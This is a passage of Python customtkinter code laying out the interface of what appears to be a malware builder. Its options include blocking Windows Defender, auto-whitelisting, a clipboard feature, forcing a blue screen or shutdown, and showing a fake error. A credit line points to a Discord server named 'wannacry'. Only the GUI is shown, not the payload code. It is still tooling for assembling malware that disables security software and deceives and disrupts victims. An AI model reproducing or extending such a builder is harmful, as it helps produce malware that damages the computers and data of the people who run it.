wd_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=wd_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
wd_checkbox.place(y=525, x=550)
wd_label = ctk.CTkLabel(builder, text="Block WD", font=("Alatsi", 22))
wd_label. place(y=513, x=600)

whitelist_var = ctk.BooleanVar(value=False)
whitelist_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, checkbox_height=28, variable=whitelist_var, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
whitelist_checkbox.place(y=275, x=800)
whitelist_label = ctk.CTkLabel(builder, text="Auto Whitelist", font=("Alatsi", 22))
whitelist_label.place(y=263, x=850)

clipboard_var = ctk.BooleanVar(value=False)
clipboard_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, checkbox_height=28, variable=clipboard_var, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
clipboard_checkbox.place(y=325, x=800)
clipboard_label = ctk.CTkLabel(builder, text="Clipboard", font=("Alatsi", 22))
clipboard_label.place(y=313, x=850)

bsod_var = ctk.BooleanVar(value=False)
bsod_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, checkbox_height=28, variable=bsod_var, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="", command=lambda: bsod_and_shutdown("BSOD"))
bsod_checkbox.place(y=375, x=800)
bsod_label = ctk.CTkLabel(builder, text="Blue screen", font=("Alatsi", 22))
bsod_label.place(y=363, x=850)

shutdown_var = ctk.BooleanVar(value=False)
shutdown_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, checkbox_height=28, variable=shutdown_var, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="", command=lambda: bsod_and_shutdown("Shutdown"))
shutdown_checkbox.place(y=425, x=800)
shutdown_label = ctk.CTkLabel(builder, text="Shutdown", font=("Alatsi", 22))
shutdown_label.place(y=413, x=850)

error_var = ctk.BooleanVar(value=False)
error_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, checkbox_height=28, variable=error_var, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="", command=config_fake_error)
error_checkbox.place(y=475, x=800)
error_label = ctk.CTkLabel(builder, text="Fake error", font=("Alatsi", 22))
error_label.place(y=463, x=850)

verifiaction_label = ctk.CTkLabel(builder, text="", fg_color="#1b1b1b", font=("Arial", 12))
verifiaction_label.place(y=655, x=577)

credits_label = ctk.CTkLabel(builder, fg_color="#171717", text="By NOONE     |    discord.gg/wannacry", font=("Alatsi", 13))
credits_label.place(y=715, x=15)

next_step_button = ctk.CTkButton(builder, text="Continue", fg_color="#545454", height=48, width=220, font=("Archivo Black", 21), hover_color="red", command=check_before_nextstep)
next_step_button.place(y=600, x=555)

builder.mainloop()
